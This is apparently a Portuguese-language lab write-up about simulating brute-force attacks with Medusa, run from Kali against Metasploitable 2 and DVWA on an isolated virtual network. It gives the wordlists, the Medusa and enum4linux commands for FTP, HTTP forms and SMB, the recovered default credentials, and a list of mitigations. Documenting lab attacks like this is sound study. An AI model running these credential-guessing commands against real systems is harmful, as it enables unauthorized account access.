# Projeto: Simulação de Ataques de Força Bruta com Medusa (Kali + Metasploitable/DVWA)

## 1. Objetivo
- Compreender ataques de força bruta em diferentes serviços (FTP, Web, SMB);
- Utilizar o Kali Linux e o Medusa para auditoria de segurança em ambiente controlado;
- Documentar processos técnicos de forma clara e estruturada;
- Reconhecer vulnerabilidades comuns e propor medidas de mitigação;
- Utilizar o GitHub como portfólio técnico para compartilhar documentação e evidências.

## 2. Ambiente de Teste
- Host: VirtualBox (Host-Only network)
- VMs:
  - Kali Linux (192.168.56.102)
  - Metasploitable 2: (192.168.56.101)
  - DVWA em /var/www/html/dvwa

## 3. Ferramentas
- Medusa, enum4linux, smbclient, curl, netcat, wireshark

## 4. Wordlists usadas
- users.txt
- passwords.txt

## 5. Comandos Executados
### Criação de Wordlists
`echo -e "user\nmsfadmin\nroot\nadmin" > users.txt`
`echo -e "123456\npassword\nmsfadmin\nqwerty" > passwords.txt`
### FTP
`medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 4 -v 4 | tee medusa_ftp.log`
- Legenda de flags:
  - -h alvo
  - -U arquivo de usuários (linha por linha)
  - -P arquivo de senhas
  - -M módulo (ftp, smbnt, http, ssh, etc.)
  - -t 4 threads (execuções simultâneas)
  - -v 4 verbose (detalhe de output no terminal)

tee medusa_ftp.log para salvar saída

### HTTP (template)
`medusa -h 192.168.56.101 -M http_form -m FORM:... -U users.txt -P passwords.txt -t 6 -v 4 | tee medusa_http.log`

### SMB / Password Spraying
`enum4linux -a 192.168.56.101`
`medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -t 4 -v 4 | tee medusa_smb.log`

## 6. Resultados e validação
- Credenciais descobertas:
  - user: msfadmin / password: msfadmin (exemplo)
- Comandos de validação:
  - `ftp 192.168.56.101`, `smbclient -L //192.168.56.101 -U msfadmin`

## 7. Recomendações de Mitigação
- Lockout / throttle: bloqueio após N tentativas ou backoff exponencial.
- MFA para acessos críticos (FTP, aplicações web).
- Rate limiting em endpoints de login e WAF.
- Senha forte + política de expiração; no geral tokens e senhas únicas.
- Monitoring / SIEM: alertas para múltiplas falhas de autenticação, geolocalização anômala.
- Fail2ban em serviços (FTP/SSH/web) para bloquear IPs após muitas falhas.
- Desativar serviços não necessários (ex.: FTP se não for usado)
- Segurança SMB: aplicar patches, desabilitar SMBv1, políticas de bloqueio.
- Proteção CSRF / tokens em formulários (DVWA exemplo).
- Treinamento de usuários e pentests periódicos.
